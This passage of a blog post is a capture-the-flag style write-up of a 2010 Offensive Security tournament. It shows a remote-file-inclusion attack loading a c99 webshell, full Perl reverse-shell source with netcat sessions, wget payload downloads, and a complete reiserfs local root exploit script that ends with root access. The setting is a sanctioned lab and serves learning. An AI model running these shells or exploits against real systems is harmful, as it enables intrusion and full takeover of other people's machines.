+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image21.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb21.png" alt="image" width="380" height="144" border="0"></a></p>
+<p>(maybe they renamed the file and changed the filename in 
+slogin_lib.inc.php). We can try to bruteforce these files, but let’s 
+save some time and try to find out if we can use the RFI bug. An RFI bug
+ can lead to a lot of things, including injecting code and run it on the
+ webserver (if we can for example inject it into a file that is used in a
+ vulnerable “include” statement).</p>
+<p>A request to <a href="http://192.168.6.66/1/slogin_lib.inc.php">http://192.168.6.66/1/slogin_lib.inc.php</a> resulted in a 200 OK reply, so the file seems to be there.</p>
+<p>The exploit code (milw0rm) indicates that this “Simple Text-File 
+Login script”&nbsp; file (slogin_lib.inc.php) can be exploited using the
+ following request :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">[!] EXPLOIT: /[<span style="color: #5576D1;">path</span>]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]</pre>
+<blockquote><p>Current time is 3:30am. Time for bed.</p>
+<p>Sunday morning, 10am. Back in business, time to continue work… 
+reading all about the RFI bug, trying out some requests… but nothing 
+seems to work today.</p></blockquote>
+<p>Around 4pm, I tried this :</p>
+<p><a title="http://192.168.6.66/1/slogin_lib.inc.php?slogin_path=http://192.168.6.71/&amp;cmd=ls%20-als" href="http://192.168.6.66/1/slogin_lib.inc.php?slogin_path=http://192.168.6.71/&amp;cmd=ls%20-als">http://192.168.6.66/1/slogin_lib.inc.php?slogin_path=http://192.168.6.71/&amp;cmd=ls%20-als</a></p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image22.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb22.png" alt="image" width="501" height="149" border="0"></a></p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image23.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb23.png" alt="image" width="414" height="219" border="0"></a></p>
+<p>aha- that looks great. It looks like code can be injected 
+(header.inc.php file) and it would run on the webserver. (header.inc.php
+ is added to the request automatically, so if I host some code in a file
+ called header.inc.php, it would get included by just pointing the 
+parameter to the root of the webserver.</p>
+<p>I already figured out I can run commands within the context of the 
+webserver account, but perhaps things can be made a bit easier : inject a
+ full blown php shell.</p>
+<p>Plan :</p>
+<ul>
+<li>get a copy of a php webshell (I used c99 but there are many more)</li>
+<li>rename it to header.inc.php,</li>
+<li>host it somewhere so it can be injected into the request</li>
+<li>inject/execute it</li>
+</ul>
+<p>Where can I find a webserver for this… ?&nbsp; I could try to host it
+ on my attacker machine… but there is a better solution.&nbsp; There’s a
+ webserver (surgemail) available on 192.168.6.70/71/72.&nbsp;&nbsp; I 
+have ftp write access to that server, so I can just drop some files in 
+the c:\surgemail\www folder.</p>
+<p>In addition to the webshell, it might be nice to have a reverse shell
+ set up from the webserver to my box, so I can easily issue OS 
+commands.&nbsp; One of my friends (mr_me) gave me a copy of cb_shell.pl,
+ I simply renamed it to corelanshell.pl and uploaded it to the webserver
+ as well :-)</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">#!/usr/bin/perl
+#
+# Connect back shell version 0.0
+# Created by Depth
+# Full hide version
+# Use: cb_shell.pl <address> <port> <fake_name>
+# netcat -l -p <port> (localhost)
+# 
+
+<span style="color: #5576D1;">use</span> IO::Socket;
+$0 = $ARGV[2];
+<span style="color: #5576D1;">my</span> $sock = new IO::Socket::INET (PeerAddr =&gt; $ARGV[0],PeerPort =&gt; $ARGV[1],Proto =&gt; 'tcp');
+<span style="color: #5576D1;">connect</span>(CLIENT,$sockaddr); 
+
+<span style="color: #5576D1;">print</span> $sock "<span style="color: #7fec7f;">:: Depth :: Connect Back Shell ::\n</span>";
+<span style="color: #5576D1;">if</span>(<span style="color: #5576D1;">fork</span>() == 0){
+ STDIN-&gt;fdopen($sock,w);
+ STDOUT-&gt;fdopen($sock,w);
+ STDERR-&gt;fdopen($sock,w);
+ <span style="color: #5576D1;">system</span>("<span style="color: #7fec7f;">/bin/sh</span>");
+ <span style="color: #5576D1;">close</span>($sock);
+ <span style="color: #5576D1;">exit</span>;
+}</port></fake_name></port></address></pre>
+<p>Upload script in action (saves me some time when machines get reverted :) )</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">root@krypt2:/vpn/70# ftp -inv 192.168.6.70 &lt; ftpcmd       
+Connected to 192.168.6.70.
+220-Complete FTP server
+220 FTP Server v 3.3.0
+331 Password required for devil
+230 User devil logged in.
+Remote <span style="color: #5576D1;">system</span> type is UNIX.
+Using binary mode to transfer files.
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/......</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../......</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../......</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../......</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../....../surgemail</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../....../surgemail/www</span>".
+200 Type set to I
+<span style="color: #5576D1;">local</span>: corelanshell.pl remote: corelanshell.pl
+200 PORT command successful.
+150 Opening BINARY mode data connection for corelanshell.pl
+226 Transfer complete.
+519 bytes sent in 0.00 secs (2077.2 kB/s)
+<span style="color: #5576D1;">local</span>: header.inc.php remote: header.inc.php
+200 PORT command successful.
+150 Opening BINARY mode data connection for header.inc.php
+226 Transfer complete.
+150397 bytes sent in 0.94 secs (156.4 kB/s)
+221 Goodbye.</pre>
+<p>Ok, so far so good. Next, I will</p>
+<p>1. get the header.inc.php to execute and give me a nice web shell gui</p>
+<p>2. use the gui to download the corelanshell.pl file</p>
+<p>3. execute the perl script and get myself a reverse shell</p>
+<p>&nbsp;</p>
+<p><strong>Step 1 :</strong></p>
+<p><a title="http://192.168.6.66/1/slogin_lib.inc.php?slogin_path=http://192.168.6.70/" href="http://192.168.6.66/1/slogin_lib.inc.php?slogin_path=http://192.168.6.70/">http://192.168.6.66/1/slogin_lib.inc.php?slogin_path=http://192.168.6.70/</a></p>
+<p>=&gt; This will basically grab the php shell from 192.168.6.70 (in the webroot, header.inc.php) and execute it</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image99.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image99_thumb.png" alt="image" width="380" height="353" border="0"></a></p>
+<p>Using the “find all writeable dirs and files” option, I gathered a list of writeable folders :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">  2693    4 -rw-rw-rw-   1 root     root          163 May  4 15:52 /var/run/motd
+   840    0 lrwxrwxrwx   1 root     root            5 May  4 02:26 /var/tmp -&gt; /tmp/
+  2696    0 drwxrwxrwt   4 root     root           80 May  4 15:52 /var/lock
+ 35652    0 lrwxrwxrwx   1 root     root           18 Apr 29 21:25 /var/lib/python-support -&gt; /usr/lib/pymodules
+  5339    0 lrwxrwxrwx   1 root     root            7 Apr 29 21:18 /var/spool/mail -&gt; ../mail
+ 49222    4 drw-rw-rw-   2 root     root         4096 May  4 06:55 /opt/data
+    15    0 lrwxrwxrwx   1 root     root            7 Apr 29 21:18 /media/floppy -&gt; floppy0
+    13    0 lrwxrwxrwx   1 root     root            6 Apr 29 21:18 /media/cdrom -&gt; cdrom0
+ 16655    0 lrwxrwxrwx   1 root     root           37 Apr 29 21:19 /initrd.img -&gt; boot/initrd.img-2.6.31-14-generic-pae
+ 36865    1 drwxrwxrwt   2 root     root         1024 May  4 05:43 /tmp/.X11-unix
+ 24577    1 drwxrwxrwt   2 root     root         1024 May  4 05:43 /tmp/.ICE-unix
+4026531841    0 lrwxrwxrwx   1 root     root            8 May  4 16:01 /proc/net -&gt; self/net
+4026531840    0 lrwxrwxrwx   1 root     root           11 May  4 16:01 /proc/mounts -&gt; self/mounts</pre>
+<p>/var/lock might be a good target to place my files.</p>
+<p><strong>Step 2 :</strong></p>
+<p>Went to the /var/lock folder and downloaded the corelanshell.pl file from the webserver at 192.168.6.70 :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image25.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb25.png" alt="image" width="309" height="356" border="0"></a></p>
+<p>=&gt;</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image26.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb26.png" alt="image" width="363" height="133" border="0"></a></p>
+<p><strong>Step 3 :</strong></p>
+<p>First, set up a netcat listener on my “attacker” machine :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">nc -lvp 4455</pre>
+<p>Next, ran the following command on the server :</p>
+<p>perl /var/lock/corelanshell.pl 192.168.6.114 4455 :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image27.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb27.png" alt="image" width="297" height="416" border="0"></a></p>
+<p>Result :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">root@krypt2:/vpn/70# nc -lvp 4455             
+listening on [any] 4455 ...
+<span style="color: #5576D1;">connect</span> to [192.168.6.114] from (UNKNOWN) [192.168.6.66] 56073
+:: Depth :: Connect Back Shell ::</pre>
+<p>Ok, I’ve got a nice reverse shell.</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">root@krypt2:/vpn/70# nc -lp 4455
+:: Depth :: Connect Back Shell ::
+pwd
+/var/<span style="color: #5576D1;">lock</span>
+ls -al
+total 8
+drwxrwxrwt  4 root     root      100 May  4 15:58 .
+drwxr-xr-x 14 root     root     4096 May  4 02:26 ..
+drwxr-xr-x  2 www-data root       40 May  4 15:52 apache2
+-rw-r--r--  1 www-data www-data  519 May  6  2010 corelanshell.pl
+drwx------  2 root     root       40 May  4 15:52 lvm</pre>
+<p>Unfortunately I’m not running as root, so if the secret file is 
+hidden somewhere/protected, then I need to find a way to get more privs.</p>
+<p>Just to be sure, I did a quick search for all txt files, but couldn’t find anything useful.</p>
+<p>Perhaps a local root exploit might work. The system seems to be running</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">Linux ghost 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux</pre>
+<p>I tried about a dozen of local root exploits… but they all failed 
+miserably… and lost a huge amount of time… (and I have to admit that I’m
+ not that strong in Linux exploitation. )</p>
+<p>But I never give up.</p>
+<p>I looked at /etc/fstab :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">cat /etc/fstab
+# /etc/fstab: static file <span style="color: #5576D1;">system</span> information.
+#
+# Use 'blkid -o <span style="color: #5576D1;">value</span> -s UUID' to <span style="color: #5576D1;">print</span> the universally unique identifier
+# for a device; this may be used with UUID= as a more robust way to name
+# devices that works even <span style="color: #5576D1;">if</span> disks are added and removed. See fstab(5).
+#
+# <file <span="" style="color: #5576D1;">system&gt; <mount point="">   <type>  <options>       &lt;<span style="color: #5576D1;">dump</span>&gt;  <pass>
+proc            /proc           proc    defaults        0       0
+/dev/mapper/ghost-root /               ext4    errors=remount-ro 0       1
+# /boot was on /dev/sda5 during installation
+UUID=f9f46813-a78a-42e8-a007-53308212ee26 /boot           ext2    defaults        0       2
+/dev/sdb1 /apachelogs          reiserfs    user,noauto,rw,<span style="color: #5576D1;">exec</span>,suid,user_xattr        0       2
+/dev/sdc1 /tmp         ext2        noexec,nosuid,rw                    0       0
+/dev/mapper/ghost-swap_1 none            swap    sw              0       0
+/dev/scd0       /media/cdrom0   udf,iso9660 user,noauto,<span style="color: #5576D1;">exec</span>,utf8 0       0
+/dev/fd0        /media/floppy0  auto    rw,user,noauto,<span style="color: #5576D1;">exec</span>,utf8 0       0</pass></options></type></mount></file></pre>
+<p>=&gt; /apachelogs has reiserfs… and that’s suspicious.</p>
+<p>So I searched for a local sploit that takes advantage of a bug in reiserfs, and I found this one :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image34.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb34.png" alt="image" width="282" height="82" border="0"></a></p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image35.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb35.png" alt="image" width="283" height="56" border="0"></a></p>
+<p><a title="http://www.exploit-db.com/exploits/12130" href="http://www.exploit-db.com/exploits/12130">http://www.exploit-db.com/exploits/12130</a></p>
+<p>After having poked around on the server, I noticed that tools such as
+ gcc, cc etc were missing, and that paths to common binaries were not 
+defined.&nbsp; On top of that, the default exploit code is based on the 
+fact that the root filesystem is reiserfs, which is not the case here.</p>
+<p>I figured I would end up having to mod the python code (preferably on
+ the machine itself), and that would be problematic with my perl 
+connect-back shell (vim issues etc). So I decided to make my life 
+somewhat easier and decided to use <a href="http://www.cycom.se/dl/rrs">rrs</a>
+ to get a better shell (compiled, renamed it to corelanshell, uploaded 
+it to 192.168.6.70, downloaded it into /apachelogs/data and ran it)</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image31.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb31.png" alt="image" width="649" height="171" border="0"></a></p>
+<p>By that time, another revert wiped out my files again, and I figured 
+to just mod the files offline and use the perl connect back script. It 
+should work just fine.</p>
+<p>&nbsp;</p>
+<p>Anyways, this is what was needed to root the box and see if the proof file can be found in one of the “root-protected” folders:</p>
+<ol>
+<li>compile the payload separately (because there is no cc/gcc on the ghost machine)</li>
+<li>edit the python script and change all paths to absolute 
+references.&nbsp; The plan is to put the files on /apachelogs/data (just
+ a folder to keep files together) and run the script/pre-compiled code 
+from there</li>
+<li>upload the files (precompiled exploit + python script) and put the script in a location that is not mounted with noexec</li>
+<li>make the necessary reiserfs folder on the filesystem</li>
+<li>execute the script &amp; sploit</li>
+<li>search proof file and cat the contents</li>
+</ol>
+<p>&nbsp;</p>
+<p><strong>Step 1</strong> : compiling the payload (offline, I just used my backtrack system to compile :)</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">root@krypt2:/vpn/70# cat corelanc0d3r.c
+int main(void) { setgid(0); setuid(0); execl("<span style="color: #7fec7f;">/bin/sh</span>", "<span style="color: #7fec7f;">sh</span>", 0); }
+root@krypt2:/vpn/70# cc -w corelanc0d3r.c -o corelanc0d3r</pre>
+<p>&nbsp;</p>
+<p><strong>Step 2</strong> : Modify the original python script</p>
+<ul>
+<li>leave out the components that would deal with the compilation and check if the compilation was successful</li>
+<li>make absolute file/path references</li>
+<li>point the xattrs into /apachelogs (instead of /)</li>
+</ul>
+<p>(sud0 and the others from Corelan Team fixed most of the issues I had
+ with the script – and they finally rooted the machine before I could… 
+so big kudos to them)</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;"><span style="color: #5576D1;">import</span> <span style="color: #5576D1;">os</span>, <span style="color: #5576D1;">sys</span>
+#SHELL = 'int main(void) { setgid(0); setuid(0); execl("<span style="color: #7fec7f;">/bin/sh</span>", "<span style="color: #7fec7f;">sh</span>", 0); }'
+XATTR = '\x41\x58\x46\x52\xc1\x00\x00\x02\x01\x00\x00\x02\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+ 
+<span style="color: #5576D1;">def</span> err(txt):
+    <span style="color: #5576D1;">print</span> '[-] error: %s' % txt
+    <span style="color: #5576D1;">sys</span>.<span style="color: #5576D1;">exit</span>(1)
+ 
+<span style="color: #5576D1;">def</span> msg(txt):
+    <span style="color: #5576D1;">print</span> '[+] %s' % txt
+ 
+<span style="color: #5576D1;">def</span> main():
+    msg('checking for reiserfs mount with user_xattr mount option')
+    f = <span style="color: #5576D1;">open</span>('/etc/fstab')
+    for line in f:
+        <span style="color: #5576D1;">if</span> 'reiserfs' in line and 'user_xattr' in line:
+            break
+    <span style="color: #5576D1;">else</span>:
+        err('failed to <span style="color: #5576D1;">find</span> a reiserfs mount with user_xattr')
+    f.<span style="color: #5576D1;">close</span>()
+ 
+    msg('checking for private xattrs directory at /apachelogs/.reiserfs_priv/xattrs')
+ 
+    <span style="color: #5576D1;">if</span> not <span style="color: #5576D1;">os</span>.<span style="color: #5576D1;">path</span>.exists('/apachelogs/.reiserfs_priv/xattrs'):
+        err('failed to locate private xattrs directory')
+  
+    msg('capturing pre-shell snapshot of private xattrs directory')
+    pre = set(<span style="color: #5576D1;">os</span>.listdir('/apachelogs/.reiserfs_priv/xattrs'))
+     
+    msg('setting dummy xattr to get reiserfs object id')
+ 
+    ret=<span style="color: #5576D1;">os</span>.system('setfattr -n "<span style="color: #7fec7f;">user.hax</span>" -v "<span style="color: #7fec7f;">hax</span>" /apachelogs/<span style="color: #5576D1;">data</span>/corelanc0d3r')
+    <span style="color: #5576D1;">if</span> ret != 0:
+        err('error setting xattr, you need setfattr')
+ 
+    msg('capturing post-shell snapshot of private xattrs directory')
+    post = set(<span style="color: #5576D1;">os</span>.listdir('/apachelogs/.reiserfs_priv/xattrs'))
+    objs = post.difference(pre)
+ 
+    msg('found %s <span style="color: #5576D1;">new</span> object ids' % len(objs))
+    for obj in objs:
+        msg('setting cap_setuid/cap_setgid capabilities on object id %s' % obj)
+        f = <span style="color: #5576D1;">open</span>('/apachelogs/.reiserfs_priv/xattrs/%s/security.capability' % obj, 'w')
+        f.<span style="color: #5576D1;">write</span>(XATTR)
+        f.<span style="color: #5576D1;">close</span>()
+ 
+    msg('spawning setuid shell...')
+    <span style="color: #5576D1;">os</span>.system('/apachelogs/<span style="color: #5576D1;">data</span>/corelanc0d3r')
+ 
+<span style="color: #5576D1;">if</span> __name__ == '<span style="color: #5576D1;">__main__</span>':
+    main()</pre>
+<p>&nbsp;</p>
+<p><strong>Step 3 </strong>: upload the files</p>
+<p>I basically uploaded both files (corelanc0d3r and reis.py) to 
+192.168.6.70 (via ftp, put them in c:\surgemail\www). Next, I downloaded
+ them from my os shell onto the “ghost” machine using some simple wget 
+calls.</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">root@krypt2:/vpn/70# ftp -<span style="color: #5576D1;">inv</span> 192.168.6.70 &lt; ftpcmd 
+Connected to 192.168.6.70.
+220-Complete FTP server
+220 FTP Server v 3.3.0
+331 Password required for devil
+230 User devil logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/......</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../......</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../......</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../......</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../....../surgemail</span>".
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../....../surgemail/www</span>".
+200 Type set to I
+local: corelanc0d3r remote: corelanc0d3r
+200 PORT command successful.
+150 Opening BINARY mode <span style="color: #5576D1;">data</span> connection for corelanc0d3r
+226 Transfer complete.
+9125 bytes sent in 0.40 secs
+local: reis.py remote: reis.py
+200 PORT command successful.
+150 Opening BINARY mode <span style="color: #5576D1;">data</span> connection for reis.py
+226 Transfer complete.
+1801 bytes sent in 0.37 secs
+221 Goodbye.</pre>
+<p>I already had planted the corelanshell.pl script on 192.168.6.70, so I issued the following command using the c99 webshell :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">perl /var/lock/corelanshell.pl 192.168.6.114 4455</pre>
+<p>Reverse connection accepted, ready to get the 2 files and put them on the server</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">root@krypt2:/vpn/70# nc -lp 4455
+
+:: Depth :: Connect Back Shell ::
+cd /apachelogs
+mkdir <span style="color: #5576D1;">data</span>
+cd <span style="color: #5576D1;">data</span>
+wget http:<span style="color: #d7df01;">//192.168.6.70/corelanc0d3r</span>
+wget http:<span style="color: #d7df01;">//192.168.6.70/reis.py</span></pre>
+<p>Find a good location (not mounted with noexec)…&nbsp; =&gt; /dev/shm</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image40.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb40.png" alt="image" width="373" height="201" border="0"></a></p>
+<p>(I moved the reis.py file to that location)</p>
+<p>(important to note that /apachelogs does not show up in the mount 
+list… but I didn’t try to mount it myself… perhaps I should have).</p>
+<p>&nbsp;</p>
+<p><strong>Step 4 </strong>: prepare folders</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">cd /apachelogs
+mkdir .reiserfs_priv
+mkdir .reiserfs_priv/xattrs</pre>
+<p>&nbsp;</p>
+<p><strong>Step 5 </strong>: 0wn</p>
+<p>Current situation :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">/apachelogs/<span style="color: #5576D1;">data</span>/corelanc0d3r  =&gt; compiled payload
+/dev/shm/reis.py =&gt; python script</pre>
+<p>Launch the exploit :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 650px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">cd /dev/shm
+ls
+reis.py
+
+python ./reis.py
+id
+uid=0(r00t) gid=0(r00t) groups=33(www-data)</pre>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">cat /root/proof.txt
+sDSjnSo22bSe12sadjdjrudfknk4455qndlas4</pre>
+<p>&nbsp;</p>
+<h4>Conclusions</h4>
+<ul>
+<li>Using redirects and custom reponses, modifying headers etc are good.
+ They will slow down scripts and script kiddies but won’t stop seasoned 
+hackers from discovering the real identity/engines and/or breaking into 
+the system.</li>
+<li>Although it was somewhat hidden, the “ghost” machine runs some 
+vulnerable code, giving an attacker the ability to issue commands on the
+ system and get a shell. Don’t rely on the “need to know” principle. 
+Hackers will find out that you planted files somewhere and if it’s 
+vulnerable, they will use it to hack into your system.</li>
+<li>The web server runs with a low privilege account, but the 
+combination of the vulnerable code, with insecure file/folder 
+permissions (write access + execute access) may allow for further 
+exploitation.</li>
+<li>On top of that, the reiserfs implementation is buggy and can allow 
+an attacker to escalate privileges, essentially allowing him to obtain 
+root permissions.</li>
+<li>Weak firewall rules : allowing a server to access other servers 
+(outbound connections), when that is not really necessary, may provide a
+ hacker the ability to serve/download malicious files.</li>
+</ul>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h3>Challenge 3 : Ghost2 (joke of the day)</h3>
+<p>After having finished the challenges, I decided to have some fun with
+ the guys in the #HSIYF channel, and try to spread the rumour that I had
+ found another (hidden) machine. I told them that this machine does not 
+show any open ports, but it does respond to http requests on port 8080 
+when connected (pivoting) from 192.168.6.70/71/72.</p>
+<p>About 2 hours before the games ended, I posted the output of (an obvious fake) exploit to the channel :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">c:\sploits&gt;perl corelan0wner_iis0day.pl 192.168.6.xx 8080
+[+] corelanc0d3r's sploit for ghost2 (hidden machine)
+[+] Creating payload... 
+[+] Connecting to port 8080
+[+] Sending stage 1 (3219 bytes)...
+[+] Sending stage 2 (1211 bytes)...
+[+] Sleeping 30 seconds (<span style="color: #5576D1;">wait</span> for hunter)
+[+] Sending stage 3 (2104 bytes, priv escalation)
+[+] ...
+[+] Telnet to port 5555
+
+Microsoft Windows [Version 6.0.6001]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved
+
+C:\Windows\<span style="color: #5576D1;">system</span>32&gt;whoami
+NT AUTHORITY\SYSTEM</pre>
+<p>I’m not sure how many people fell for it and went back to the 
+“killthen00b” machines, to see if there was something they could find 
+from that machine….</p>
+<p>The number of PM’s I reveived, following my fake message was a good 
+indication that I managed to freak out a number of people… that was 
+fun.&nbsp; Panic all over the place :D</p>
+<p>So OffSec, if you noticed some high(er) traffic on killthen00b, about 2 hours before the games ended…&nbsp; Sorry for that :)</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h3>Finally :</h3>
+<ul>
+<li>Big high five to my friends at Corelan Team. You guys rock !</li>
+<li>Make no mistake – although reading this write-up probably took you 
+max. half an hour or so, actually taking the challenge took a LOT longer
+ (also caused by the fact that I spent about a day in the 
+hospital).&nbsp; Anyways, I still had a lot of fun and learned a lot.</li>
+<li>Greetz to some of the other participants (VADiUM, smtx, raph0x88, 
+fireking300, etc… at least you guys didn’t delete my files on the server
+ :) Respect for that )</li>
+</ul>
+<blockquote><p>By the way : smtx made a nice video about the “ghost challenge”. You can see the video here : <a href="http://www.information-security-training.com/videos/smtx-ghost-challenge-video/">http://www.information-security-training.com/videos/smtx-ghost-challenge-video/</a></p></blockquote>
+<p>&nbsp;</p>
+<h3>Ranking</h3>
+<p>Rank before submitting the documentation :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image42.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb42.png" alt="image" width="221" height="289" border="0"></a></p>
+<p>Final rank :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image43.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb43.png" alt="image" width="234" height="234" border="0"></a></p>
+<p>(So I guess this documentation/blogpost sucks).</p>
+<p>Oh well.</p>
+<p style="text-align:left">© 2010 – 2015, <a href="https://www.corelan.be/">Corelan Team (corelanc0d3r)</a>. All rights reserved. </p>
